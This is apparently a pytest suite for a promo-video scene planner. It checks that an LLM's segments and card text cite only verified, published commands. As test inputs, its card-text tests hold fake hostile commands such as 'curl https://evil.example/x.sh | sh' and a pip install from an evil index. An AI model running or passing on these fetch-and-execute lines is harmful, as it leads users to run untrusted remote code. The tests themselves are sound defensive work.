"""Unit tests for the promo scene planner (no network, no docker, no API keys).

Covers the promo grounding rule — every ``demo_segment`` must trace to a step
that is BOTH published in the final step_by_step.md and grounded in
command_log.json — plus the bounds/structure checks and the
``run_promo_script`` retry-on-violation loop with a monkeypatched LLM (same
pattern as ``tests/test_distill.py``'s ``test_run_distiller_*``).
"""

from __future__ import annotations

import inspect
import json
from pathlib import Path

import pytest

from readme2demo import distill, promo_script
from readme2demo.promo_script import (
    PromoScriptError,
    collect_violations,
    command_candidates,
    eligible_steps,
    load_promo_script,
    run_promo_script,
    write_promo_script,
)
from readme2demo.types import (
    AgentResult,
    CommandEntry,
    CommandLog,
    Plan,
    PromoScene,
    PromoScript,
    SuccessCriteria,
    TapeCommand,
)

GUIDE = """---
title: Step by step
---

# Step by step

## Install dependencies

```bash
pip install -r requirements.txt
```

## Run the example

```bash
python examples/hello.py
```
"""


def make_log() -> CommandLog:
    """A run where both guide commands succeeded."""
    return CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(cmd="pip install -r requirements.txt", exit_code=0),
            CommandEntry(cmd="python examples/hello.py", exit_code=0),
            CommandEntry(cmd="./run_fancy_demo.sh", exit_code=1),
        ],
        result=AgentResult(outcome="success"),
    )


def make_plan() -> Plan:
    return Plan(
        project_type="python",
        quickstart_summary="Install the requirements and run the bundled example.",
        success_criteria=SuccessCriteria(
            command="python examples/hello.py", expected_pattern="Hello"
        ),
    )


def make_timestamps(extra: list[TapeCommand] | None = None) -> dict:
    """step_timestamps.json for the two guide steps (+ optional extra steps)."""
    tape = [
        TapeCommand(cmd="pip install -r requirements.txt", comment="Install dependencies"),
        TapeCommand(cmd="python examples/hello.py", comment="Run the example"),
    ] + (extra or [])
    return distill.step_timestamps(tape, seed_worktree=False)


def window(timestamps: dict, index: int) -> tuple[float, float]:
    step = timestamps["steps"][index]
    return step["start_min_s"], step["end_min_s"]


def make_script(timestamps: dict, index: int = 1) -> PromoScript:
    """A valid script: title card + one segment of step ``index`` + end card."""
    lo, hi = window(timestamps, index)
    return PromoScript(
        total_duration_s=6.0 + (hi - lo),
        scenes=[
            PromoScene(kind="title_card", text="acme/hello — verified", duration_s=2.5),
            PromoScene(
                kind="demo_segment",
                step_index=index,
                start_s=lo,
                end_s=hi,
                duration_s=hi - lo,
            ),
            PromoScene(
                kind="end_card", text="python examples/hello.py", duration_s=3.5
            ),
        ],
    )


# -- duration bookkeeping vs budget (#169, real run glow-20260805-181029) ------


def test_regression_mismatched_total_duration_is_normalized_not_rejected() -> None:
    """Regression (#169, run glow-20260805-181029): a real verified run lost its
    promo cut to `total_duration_s (30.0) is not the sum (34.0)`.

    total_duration_s is derivable from the scenes, so the code computes it
    instead of asking the model for arithmetic and throwing away an otherwise
    grounded plan. An off-by-anything total must normalize silently.
    """
    from readme2demo.promo_script import _normalize_total

    ts = make_timestamps()
    script = make_script(ts)
    script.total_duration_s = 30.0  # the model's (wrong) arithmetic
    real_sum = sum(sc.duration_s for sc in script.scenes)
    assert real_sum != 30.0

    normalized = _normalize_total(script)
    assert normalized.total_duration_s == pytest.approx(real_sum)
    assert collect_violations(normalized, GUIDE, make_log(), ts, make_plan()) == []


def test_regression_scenes_overshooting_the_target_are_a_violation() -> None:
    """Regression (#169): the model's REAL mistake in that run was overshooting
    the budget, but the validator complained about bookkeeping — so the retry
    was told to fix the wrong thing and failed identically. Overshoot is now
    reported in terms the model can act on."""
    ts = make_timestamps()
    script = _long_script(ts, seconds=60.0)
    violations = collect_violations(
        script, GUIDE, make_log(), ts, make_plan(), target_duration_s=30.0
    )
    assert any("targets 30.0s" in v or "target" in v for v in violations), violations
    assert not any("is not the sum" in v for v in violations)


def test_a_short_cut_is_not_a_violation() -> None:
    """Regression (#169): an honest SHORT cut must pass — failing it would
    pressure the model into padding the promo with footage the run never
    produced, which is the opposite of the point."""
    ts = make_timestamps()
    script = make_script(ts)  # well under a 30s target
    assert collect_violations(
        script, GUIDE, make_log(), ts, make_plan(), target_duration_s=30.0
    ) == []


def _long_script(timestamps: dict, seconds: float) -> PromoScript:
    """A grounded script whose CARDS pad it past the budget (segments stay
    honest — a segment may never claim more than the window it plays)."""
    script = make_script(timestamps)
    script.scenes[0].duration_s = seconds / 2
    script.scenes[-1].duration_s = seconds / 2
    from readme2demo.promo_script import _normalize_total

    return _normalize_total(script)


# -- eligibility + happy path ---------------------------------------------------


def test_eligible_steps_are_published_and_grounded() -> None:
    """Regression (#169): only steps that are BOTH in the final step_by_step.md
    and grounded in command_log.json may supply promo footage."""
    ts = make_timestamps(
        extra=[
            # In the log but never published in the guide.
            TapeCommand(cmd="./run_fancy_demo.sh", comment="Fancy"),
        ]
    )
    steps = eligible_steps(GUIDE, make_log(), ts)
    assert [s["cmd"] for s in steps] == [
        "pip install -r requirements.txt",
        "python examples/hello.py",
    ]


def test_pipe_capped_tape_variant_still_matches_its_guide_step() -> None:
    """Regression (#169, failure class 5): tape_from_guide puts the LOG's
    pipe-capped variant on camera when the guide says `cmd` and the agent
    proved `cmd | head -20`, so step_timestamps records the piped form. Raw
    string comparison would reject footage of a genuinely published step."""
    log = CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(cmd="pip install -r requirements.txt", exit_code=0),
            CommandEntry(cmd="python examples/hello.py 2>&1 | head -20", exit_code=0),
        ],
        result=AgentResult(outcome="success"),
    )
    ts = distill.step_timestamps(
        [
            TapeCommand(cmd="pip install -r requirements.txt", comment="Install"),
            # what tape_from_guide chooses for the guide's `python examples/hello.py`
            TapeCommand(cmd="python examples/hello.py | head -20", comment="Run"),
        ],
        seed_worktree=False,
    )
    assert len(eligible_steps(GUIDE, log, ts)) == 2
    assert collect_violations(make_script(ts), GUIDE, log, ts) == []

    # Symmetric direction (per failure class 5's rule that every equivalence is
    # added in both directions): the guide step carries the capping pipe and the
    # recorded step is bare. Grounding is supplied by the bare log entry, so
    # this isolates the guide-membership predicate.
    piped_guide = GUIDE.replace(
        "python examples/hello.py", "python examples/hello.py | head -20"
    )
    assert len(eligible_steps(piped_guide, make_log(), make_timestamps())) == 2


def test_chain_drifted_tape_variant_still_matches_its_guide_step() -> None:
    """Regression (#169, failure class 5): tape_from_guide types the LOG's full
    chain when the guide says `readme2demo --help` and the agent only ever ran
    `export PATH=... && readme2demo --help` (otherwise the binary is not on PATH
    on camera), so step_timestamps records the chained form. Pipe-cap drift was
    tolerated; chain drift silently dropped the footage of a published step."""
    chained = "export PATH=/home/demo/.local/bin:$PATH && readme2demo --help"
    guide = "# Step by step\n\n## Show the CLI\n\n```bash\nreadme2demo --help\n```\n"
    log = CommandLog(
        engine="claude-code",
        entries=[CommandEntry(cmd=chained, exit_code=0)],
        result=AgentResult(outcome="success"),
    )
    ts = distill.step_timestamps(
        [TapeCommand(cmd=chained, comment="Show the CLI")], seed_worktree=False
    )
    assert [s["cmd"] for s in eligible_steps(guide, log, ts)] == [chained]

    # Symmetric direction: the GUIDE carries the chain and the recorded step is
    # the bare command (class 5 wants every equivalence added both ways).
    chained_guide = f"# Step by step\n\n## Show the CLI\n\n```bash\n{chained}\n```\n"
    bare_log = CommandLog(
        engine="claude-code",
        entries=[CommandEntry(cmd="readme2demo --help", exit_code=0)],
        result=AgentResult(outcome="success"),
    )
    bare_ts = distill.step_timestamps(
        [TapeCommand(cmd="readme2demo --help", comment="Show the CLI")],
        seed_worktree=False,
    )
    assert len(eligible_steps(chained_guide, bare_log, bare_ts)) == 1

    # ...and the widening cannot launder an unproven command: same chained step,
    # a log where only the `export` half ever ran, still ineligible.
    unproven = CommandLog(
        engine="claude-code",
        entries=[CommandEntry(cmd="export PATH=/home/demo/.local/bin:$PATH", exit_code=0)],
        result=AgentResult(outcome="success"),
    )
    assert eligible_steps(guide, unproven, ts) == []

    # Blast radius, pinned deliberately rather than left to be rediscovered: a
    # recorded step that chains a published step with a PROVEN-but-unpublished
    # one is eligible, because that is footage the video really shows and the
    # legitimate case (`export PATH=… && cmd`) has exactly the same shape.
    # Unreachable in-pipeline — every step_timestamps step comes from
    # parse_guide_steps — and every segment still has to be grounded.
    extra = "python examples/hello.py && python examples/hello.py --verbose"
    both_proven = CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(cmd="python examples/hello.py", exit_code=0),
            CommandEntry(cmd="python examples/hello.py --verbose", exit_code=0),
        ],
        result=AgentResult(outcome="success"),
    )
    extra_ts = distill.step_timestamps(
        [TapeCommand(cmd=extra, comment="Run")], seed_worktree=False
    )
    assert len(eligible_steps(GUIDE, both_proven, extra_ts)) == 1


def test_steps_table_tolerates_a_step_without_an_index() -> None:
    """Regression (#169): _steps_by_index falls back to the array position when a
    payload omits `index`, but _format_steps_table did `f"{idx:<5}"` on the raw
    value — a TypeError before the first LLM call on input the lookup side
    already handled. Both sides now resolve the index the same way."""
    steps = [
        {"cmd": "python examples/hello.py", "title": "Run", "start_min_s": 1.0, "end_min_s": 2.0},
        {"index": 7, "cmd": "pytest", "title": "Test", "start_min_s": 2.0, "end_min_s": 3.0},
    ]
    table = promo_script._format_steps_table(steps)
    assert table.splitlines()[1].startswith("0    ")
    assert table.splitlines()[2].startswith("7    ")
    # And the number the table prints is the number the validator will accept.
    assert sorted(promo_script._steps_by_index({"steps": steps})) == [0, 7]


def test_valid_script_has_no_violations() -> None:
    """Regression (#169): the happy path — a segment inside its own step window,
    citing a published+grounded step, passes the validator untouched."""
    ts = make_timestamps()
    assert collect_violations(make_script(ts), GUIDE, make_log(), ts) == []


def test_run_promo_script_happy_path(monkeypatch) -> None:
    """Regression (#169): a grounded script is accepted on the first call, with
    exactly one LLM call billed."""
    ts = make_timestamps()
    script = make_script(ts)
    calls: list[str] = []

    def fake_complete_json(system, user, model, schema, **kwargs):
        calls.append(user)
        assert schema is PromoScript
        return script, 0.01

    monkeypatch.setattr(promo_script.llm, "complete_json", fake_complete_json)
    out, cost = run_promo_script(
        make_plan(), make_log(), GUIDE, ts, model="test-model",
        repo_url="https://github.com/acme/hello",
    )

    assert len(calls) == 1
    assert out is script
    assert cost == pytest.approx(0.01)
    # The prompt offers the model ONLY the verified steps.
    assert "VERIFIED STEPS" in calls[0]
    assert "python examples/hello.py" in calls[0]
    assert "./run_fancy_demo.sh" not in calls[0]


# -- grounding violations -------------------------------------------------------


def test_segment_referencing_ungrounded_step_is_a_violation() -> None:
    """Regression (#169): a step that is published in step_by_step.md but never
    succeeded in the agent run has no footage — referencing it is rejected."""
    guide = GUIDE + "\n## Fancy demo\n\n```bash\n./run_fancy_demo.sh\n```\n"
    ts = make_timestamps(extra=[TapeCommand(cmd="./run_fancy_demo.sh", comment="Fancy")])
    script = make_script(ts, index=2)
    violations = collect_violations(script, guide, make_log(), ts)
    assert any("not grounded in command_log.json" in v for v in violations)
    # It IS in the guide, so only the grounding leg fires.
    assert not any("not a step of the published" in v for v in violations)


def test_segment_referencing_unpublished_step_is_a_violation() -> None:
    """Regression (#169): a command the run executed but the published guide
    dropped is still off-limits — the promo may only show published steps."""
    log = make_log()
    log.entries.append(CommandEntry(cmd="./run_fancy_demo.sh", exit_code=0))
    ts = make_timestamps(extra=[TapeCommand(cmd="./run_fancy_demo.sh", comment="Fancy")])
    violations = collect_violations(make_script(ts, index=2), GUIDE, log, ts)
    assert any("not a step of the published" in v for v in violations)


def test_unknown_step_index_is_a_violation() -> None:
    """Regression (#169): a step_index the run never recorded is rejected — the
    model cannot invent footage by citing a number out of range."""
    ts = make_timestamps()
    script = make_script(ts)
    script.scenes[1].step_index = 47
    violations = collect_violations(script, GUIDE, make_log(), ts)
    assert any("is not a step of step_timestamps.json" in v for v in violations)


def test_script_without_demo_segment_is_rejected() -> None:
    """Regression (#169): a promo cut made only of cards has no evidence in it —
    at least one demo_segment is mandatory, enforced in code."""
    script = PromoScript(
        total_duration_s=6.0,
        scenes=[
            PromoScene(kind="title_card", text="acme/hello", duration_s=3.0),
            PromoScene(kind="end_card", text="pip install acme", duration_s=3.0),
        ],
    )
    violations = collect_violations(script, GUIDE, make_log(), make_timestamps())
    assert any("no demo_segment scene" in v for v in violations)


# -- card text ------------------------------------------------------------------


def test_card_text_may_not_invent_a_command(monkeypatch) -> None:
    """Regression (#169): the prompt told the end card to carry the install
    command "verbatim" and NOTHING checked it — an end card reading
    `pip install acme-hello-pro --index-url https://evil.example/simple` scored
    zero violations, and the compositor (#170) would burn that string into the
    video of a run that never executed it. Card commands are now grounded in
    code; the retry names the offending text, and a second offence is fatal."""
    ts = make_timestamps()
    script = make_script(ts)
    script.scenes[2].text = (
        "pip install acme-hello-pro --index-url https://evil.example/simple"
    )
    violations = collect_violations(script, GUIDE, make_log(), ts, make_plan())
    assert any("card text puts a command on screen" in v for v in violations)
    assert any("acme-hello-pro" in v for v in violations)

    # Nor a near-miss of a real command: the success command with an extra flag
    # welded on is a command the run never executed.
    doctored = make_script(ts)
    doctored.scenes[2].text = "python examples/hello.py --upload-telemetry"
    assert any(
        "card text puts a command on screen" in v
        for v in collect_violations(doctored, GUIDE, make_log(), ts, make_plan())
    )

    calls: list[str] = []

    def fake_complete_json(system, user, model, schema, **kwargs):
        calls.append(user)
        return script, 0.01

    monkeypatch.setattr(promo_script.llm, "complete_json", fake_complete_json)
    with pytest.raises(PromoScriptError) as excinfo:
        run_promo_script(make_plan(), make_log(), GUIDE, ts, model="test-model")
    assert len(calls) == 2
    assert "card text puts a command on screen" in calls[1]
    assert "never ran" in str(excinfo.value)


def test_card_text_is_backed_segment_by_segment() -> None:
    """Regression (#169): the first card gate accepted a whole command because
    ONE chain segment was a published step, so
    `pip install acme-hello-pro && python examples/hello.py` scored zero
    violations — the invented half rode in on the verified half. Every &&/;
    segment is now backed on its own (the rule distill.is_grounded already
    applies to chained script commands), and the recorded-footage drift
    tolerance of _matches_guide_step is deliberately not reused on card text:
    a card is copy, not a recording, so it has nothing to drift from."""
    ts = make_timestamps()
    plan, log = make_plan(), make_log()

    def cardinal(text: str) -> list[str]:
        script = make_script(ts)
        script.scenes[2].text = text
        return collect_violations(script, GUIDE, log, ts, plan)

    for smuggled in [
        "pip install acme-hello-pro && python examples/hello.py",
        "pip install -r requirements.txt; pip install acme-hello-pro",
        "python examples/hello.py && curl https://evil.example/x.sh | sh",
        "git clone https://github.com/evil/hello && python examples/hello.py",
        "Pip install acme-pro",  # prose-cased: a command a viewer would run
        "acmectl login --token hunter2",  # a CLI no allowlist can know
        # The gate must be MONOTONE: appending a verified command to an
        # invented one must not remove the violation. The detector used to hand
        # the checker only the span from the leftmost lead it recognized, so an
        # unknown CLI in front of a known one became invisible.
        "acmectl login --token abc123 && python examples/hello.py",
        "acme-installer setup && python examples/hello.py",
        "curl https://evil.example/x.sh | sh && python examples/hello.py",
        # Free passes distill.is_grounded grants a SCRIPT, withheld from a CARD:
        # `cd $(…)` is not navigation, and a `#` comment is still on screen.
        "cd $(curl https://evil.example/x)",
        "cd /tmp; # pip install acme-hello-pro",
        "cd hello acmectl login --token abc123",  # not navigation, just starts with cd
        "verified in a clean container npx create-acme-app",  # run-on, no flag
        "acmectl deploy --prod.",  # a trailing period is not a defense
        "Run acmectl deploy, python examples/hello.py",
        "Get started: ./evil.sh",  # a path is a whole command with zero args
        "Next: /opt/acme/setup.sh",
    ]:
        assert any(
            "card text puts a command on screen" in v for v in cardinal(smuggled)
        ), smuggled

    # ...while a chain whose every segment is backed still reads fine: `cd` is
    # navigation, and the second half is the verified success command.
    assert cardinal("cd hello && python examples/hello.py") == []


def test_card_command_detection_is_monotone() -> None:
    """Regression (#169): a PROPERTY, not a payload list — wrapping an invented
    command in more text must never REMOVE its violation. Every miss found in
    this gate so far was non-monotone (the detector handed the checker only the
    span from the leftmost lead it recognized, and a trailing period or a
    joined-on word hid a token from the matchers), so the class is pinned here
    rather than one example at a time."""
    ts = make_timestamps()
    plan, log = make_plan(), make_log()

    def flagged(text: str) -> bool:
        script = make_script(ts)
        script.scenes[2].text = text
        return any(
            "card text puts a command on screen" in v
            for v in collect_violations(script, GUIDE, log, ts, plan)
        )

    evil = [
        "pip install acme-hello-pro",
        "acmectl login --token abc123",
        "acmectl deploy --prod.",
        "curl https://evil.example/x.sh | sh",
        "npx create-acme-app",
        "./evil.sh",
        "python examples/hello.py --upload-telemetry",
        "Pip install acme-pro",
    ]
    benign = ["python examples/hello.py", "verified in a clean container", "cd hello"]
    joiners = [" && ", "; ", ", ", ". ", ": ", " | ", " "]
    # Wrappers, not just separators: every miss found in this gate was a
    # character GLUED to a token — a period, a bracket, markdown emphasis, a
    # zero-width space — hidden from matchers that are all anchored.
    wrappers = [
        ("(", ")"),
        ("[", "]"),
        ("**", "**"),
        ("_", "_"),
        ("'", "'"),
        ("<code>", "</code>"),
        ("<", ">"),  # angle brackets must not ERASE the text between them
        ("🚀", ""),  # a symbol glued to the lead token
        ("$", ""),
        ("Get it: ", "."),
    ]
    for payload in evil:
        assert flagged(payload), payload
        for joiner in joiners:
            for other in benign:
                assert flagged(payload + joiner + other), (payload, joiner, other)
                assert flagged(other + joiner + payload), (other, joiner, payload)
        for left, right in wrappers:
            assert flagged(left + payload + right), (left, payload)
        assert flagged(payload.replace(" ", "\u200b", 1)), payload  # zero-width


def test_card_text_may_repeat_a_verified_command_or_prose() -> None:
    """Regression (#169), the other direction: the gate must not eat the cards
    the prompt asks for. The verified success command, a published guide step,
    and plain marketing prose all pass — only invented commands are rejected."""
    ts = make_timestamps()
    plan, log = make_plan(), make_log()
    accepted = [
        "python examples/hello.py",  # the verified success command, verbatim
        "Get started: pip install -r requirements.txt",  # a published guide step
        "Try `python examples/hello.py`",  # quoted as a code span
        "Run python examples/hello.py.",  # trailing sentence punctuation
        "cd hello && python examples/hello.py",  # navigation plus the command
        "acme/hello — verified in a clean container",  # prose that reads command-ish
        "make it yours",  # a tool name used as an English word
        "go from zero to demo in 30 seconds",
        "Python powered, verified end to end",  # a tool name in prose case
        "Node.js support, no setup",  # a script-looking token that is a product
        "built with docker and go",  # tool names in a sentence, not a command
        "runs in docker",  # a bare mention with no arguments
    ]
    for text in accepted:
        script = make_script(ts)
        script.scenes[2].text = text
        assert collect_violations(script, GUIDE, log, ts, plan) == [], text

    # The predicate is "is there an ungrounded COMMAND in here", not "does this
    # look technical": prose stays free, commands do not — including commands
    # written in prose case, and CLIs no allowlist can enumerate.
    assert command_candidates("acme/hello — verified in a clean container") == []
    assert command_candidates("Python powered, verified end to end") == []
    assert command_candidates("Try `acmectl deploy`") == ["acmectl deploy"]
    assert command_candidates("Pip install acme-pro") == ["Pip install acme-pro"]
    assert command_candidates("acmectl login --token x") == ["acmectl login --token x"]


def test_demo_segment_may_not_carry_card_text() -> None:
    """Regression (#169): promo_script.md said a demo_segment leaves `text` null
    and _demo_violations never looked — a 240-character marketing paragraph on a
    segment returned zero violations and bypassed MAX_CARD_TEXT_CHARS, which
    only ever ran on cards."""
    ts = make_timestamps()
    script = make_script(ts)
    script.scenes[1].text = "The fastest way to ship " * 10  # 240 chars, on footage
    violations = collect_violations(script, GUIDE, make_log(), ts, make_plan())
    assert any("must leave `text` null" in v for v in violations)
    assert len(script.scenes[1].text) > promo_script.MAX_CARD_TEXT_CHARS

    empty = make_script(ts)
    empty.scenes[1].text = ""  # not null either — text belongs on a card
    assert any(
        "must leave `text` null" in v
        for v in collect_violations(empty, GUIDE, make_log(), ts, make_plan())
    )


def test_offsets_are_documented_as_tape_clock_estimates() -> None:
    """Regression (#169): step_timestamps offsets are LOWER BOUNDS on the TAPE
    clock — the preamble is wrapped in Hide/Show so it records no frames, and
    every VHS Wait blocks for execution time the model excludes — so a validated
    [start_s, end_s] can point at different footage in the real demo.mp4.
    Three of the four documentation sites called them video-clock offsets into
    demo.mp4 — as did the producer's own comment in distill.py — which invites a
    compositor to cut blind. Pin the honest semantics everywhere so 'video
    clock' cannot drift back in."""
    sources = {
        "promo_script module docstring": promo_script.__doc__ or "",
        "PromoScene docstring": PromoScene.__doc__ or "",
        "PromoScene field comments": inspect.getsource(PromoScene),
        "prompts/promo_script.md": (
            promo_script._PROMPTS_DIR / "promo_script.md"
        ).read_text(encoding="utf-8"),
        # The PRODUCER of the file, which a compositor author reads first.
        "distill.step_timestamps": inspect.getsource(distill.step_timestamps),
        "distill.build_tape_from_step_by_step": inspect.getsource(
            distill.build_tape_from_step_by_step
        ),
    }
    for name, text in sources.items():
        low = text.lower()
        assert "video clock" not in low, f"{name}: offsets are not on the video clock"
        assert "video-clock" not in low, f"{name}: offsets are not on the video clock"
        assert "tape" in low, f"{name}: does not say which clock the offsets use"
        assert "estimate" in low or "lower bound" in low, (
            f"{name}: presents the offsets as exact"
        )
    # ...and that the STEP REFERENCE is what the validator actually guarantees.
    assert "load-bearing" in (promo_script.__doc__ or "")
    assert "load-bearing" in (PromoScene.__doc__ or "")


# -- bounds + structure ---------------------------------------------------------


def test_offsets_outside_the_step_window_are_a_violation() -> None:
    """Regression (#169): a segment must cut inside the window
    step_timestamps.json assigns to its own step — borrowing a neighbour's
    footage misattributes what the viewer is shown."""
    ts = make_timestamps()
    lo, hi = window(ts, 1)
    script = make_script(ts)
    script.scenes[1].start_s = lo - 5.0  # reaches back into step 0's window
    violations = collect_violations(script, GUIDE, make_log(), ts)
    assert any("falls outside step 1's window" in v for v in violations)

    past_end = make_script(ts)
    past_end.scenes[1].end_s = ts["total_min_s"] + 60.0
    past_end.scenes[1].duration_s = past_end.scenes[1].end_s - lo
    msgs = collect_violations(past_end, GUIDE, make_log(), ts)
    assert any("past the end of demo.mp4" in v for v in msgs)
    assert hi < ts["total_min_s"] + 60.0


def test_inverted_and_missing_offsets_are_violations() -> None:
    """Regression (#169): start_s < end_s, and both are required — an empty or
    backwards span cannot be cut from the recording."""
    ts = make_timestamps()
    inverted = make_script(ts)
    lo, hi = window(ts, 1)
    inverted.scenes[1].start_s, inverted.scenes[1].end_s = hi, lo
    assert any(
        "must be less than end_s" in v
        for v in collect_violations(inverted, GUIDE, make_log(), ts)
    )

    missing = make_script(ts)
    missing.scenes[1].end_s = None
    assert any(
        "needs both start_s and end_s" in v
        for v in collect_violations(missing, GUIDE, make_log(), ts)
    )


def test_duration_and_card_structure_violations() -> None:
    """Regression (#169): durations must be positive and honest (a segment plays
    exactly its span), and cards carry text rather than video offsets.

    Note what is NOT asserted: a ``total_duration_s`` disagreeing with the sum.
    That check was removed after run glow-20260805-181029 lost a promo cut to
    it — the total is derivable, so the code normalizes it. The per-scene
    honesty check below is the one that protects grounding, and it stays.
    """
    ts = make_timestamps()
    script = make_script(ts)
    script.scenes[1].duration_s = 99.0  # no longer end_s - start_s
    script.scenes[0].text = ""  # card without text
    script.scenes[2].start_s = 1.0  # card carrying an offset
    violations = collect_violations(script, GUIDE, make_log(), ts)
    assert any("does not match" in v for v in violations)
    assert any("needs non-empty on-screen `text`" in v for v in violations)
    assert any("must leave step_index/start_s/end_s null" in v for v in violations)
    assert not any("is not the sum" in v for v in violations)

    zero = make_script(ts)
    zero.scenes[0].duration_s = 0.0
    assert any(
        "duration_s must be > 0" in v
        for v in collect_violations(zero, GUIDE, make_log(), ts)
    )


# -- run_promo_script retry loop ------------------------------------------------


def test_run_promo_script_retries_once_then_succeeds(monkeypatch) -> None:
    """Regression (#169): a violating first response triggers exactly ONE retry
    that names the violations, mirroring distill.run_distiller."""
    ts = make_timestamps()
    good = make_script(ts)
    bad = make_script(ts)
    bad.scenes[1].step_index = 47
    calls: list[str] = []

    def fake_complete_json(system, user, model, schema, **kwargs):
        calls.append(user)
        return (bad if len(calls) == 1 else good), 0.01

    monkeypatch.setattr(promo_script.llm, "complete_json", fake_complete_json)
    out, cost = run_promo_script(make_plan(), make_log(), GUIDE, ts, model="test-model")

    assert len(calls) == 2
    assert out is good
    assert cost == pytest.approx(0.02)
    assert "GROUNDING VIOLATIONS" in calls[1]
    assert "step_index 47" in calls[1]


def test_run_promo_script_raises_when_still_violating(monkeypatch) -> None:
    """Regression (#169): a script still referencing an ungrounded step after the
    retry is a hard error, and both paid calls ride on it via cost_usd (#209)."""
    guide = GUIDE + "\n## Fancy demo\n\n```bash\n./run_fancy_demo.sh\n```\n"
    ts = make_timestamps(extra=[TapeCommand(cmd="./run_fancy_demo.sh", comment="Fancy")])
    bad = make_script(ts, index=2)
    calls: list[str] = []

    def fake_complete_json(system, user, model, schema, **kwargs):
        calls.append(user)
        return bad, 0.01

    monkeypatch.setattr(promo_script.llm, "complete_json", fake_complete_json)
    with pytest.raises(PromoScriptError) as excinfo:
        run_promo_script(make_plan(), make_log(), guide, ts, model="test-model")

    assert len(calls) == 2  # one retry, no more
    assert "not grounded in command_log.json" in str(excinfo.value)
    assert excinfo.value.cost_usd == pytest.approx(0.02)


def test_run_promo_script_fails_free_when_no_step_is_eligible(monkeypatch) -> None:
    """Regression (#169): when nothing is both published and grounded, no promo
    is possible — fail before the first paid call rather than burning two."""
    calls: list[str] = []

    def fake_complete_json(system, user, model, schema, **kwargs):  # pragma: no cover
        calls.append(user)
        raise AssertionError("must not call the LLM with no eligible footage")

    monkeypatch.setattr(promo_script.llm, "complete_json", fake_complete_json)
    with pytest.raises(PromoScriptError) as excinfo:
        run_promo_script(
            make_plan(), make_log(), "# empty guide\n", make_timestamps(),
            model="test-model",
        )

    assert calls == []
    assert excinfo.value.cost_usd == 0.0
    assert "No verified step is eligible" in str(excinfo.value)


# -- artifact -------------------------------------------------------------------


def test_write_and_load_promo_script_round_trip(tmp_path: Path) -> None:
    """Regression (#169): promo_script.json is written into the run dir and
    reads back as the same PromoScript."""
    ts = make_timestamps()
    script = make_script(ts)
    dest = write_promo_script(script, tmp_path / "run")
    assert dest.name == "promo_script.json"
    payload = json.loads(dest.read_text(encoding="utf-8"))
    assert payload["version"] == 1
    assert [s["kind"] for s in payload["scenes"]] == [
        "title_card",
        "demo_segment",
        "end_card",
    ]
    assert load_promo_script(tmp_path / "run") == script
    assert load_promo_script(tmp_path / "missing") is None
